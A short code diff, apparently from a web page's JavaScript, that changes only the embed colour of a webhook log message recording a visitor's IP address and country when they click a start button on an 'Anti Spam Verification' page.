@@ -15,7 +15,7 @@ document.getElementById("start-btn").addEventListener("click", function () {
                 username: "Anti Spam Verification Log",
                 embeds: [{
                     title: "New Anti Spam Verification Attempt",
-                    color: 16711680,
+                    color: 255,
                     fields: [
                         { name: "IP Address", value: data.ip, inline: true },
                         { name: "Country", value: data.country_name, inline: true },
